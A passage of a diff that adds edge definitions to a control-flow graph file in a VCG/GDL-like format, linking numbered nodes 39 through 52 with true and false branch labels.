+edge: { sourcename: "39" targetname: "40" label: "false" color: red }
+edge: { sourcename: "39" targetname: "50" label: "true" color: darkgreen }
+// node 40
+edge: { sourcename: "40" targetname: "41" label: "false" color: red }
+edge: { sourcename: "40" targetname: "42" label: "true" color: darkgreen }
+// node 41
+edge: { sourcename: "41" targetname: "43" }
+// node 42
+edge: { sourcename: "42" targetname: "43" }
+// node 43
+edge: { sourcename: "43" targetname: "44" label: "false" color: red }
+edge: { sourcename: "43" targetname: "50" label: "true" color: darkgreen }
+// node 44
+edge: { sourcename: "44" targetname: "45" label: "false" color: red }
+edge: { sourcename: "44" targetname: "46" label: "true" color: darkgreen }
+// node 45
+edge: { sourcename: "45" targetname: "47" }
+// node 46
+edge: { sourcename: "46" targetname: "47" }
+// node 47
+edge: { sourcename: "47" targetname: "48" label: "false" color: red }
+edge: { sourcename: "47" targetname: "49" label: "true" color: darkgreen }
+// node 48
+edge: { sourcename: "48" targetname: "49" }
+// node 49
+edge: { sourcename: "49" targetname: "50" }
+// node 50
+edge: { sourcename: "50" targetname: "52" }
+// node 51
+edge: { sourcename: "51" targetname: "52" }
+// node 52
+}
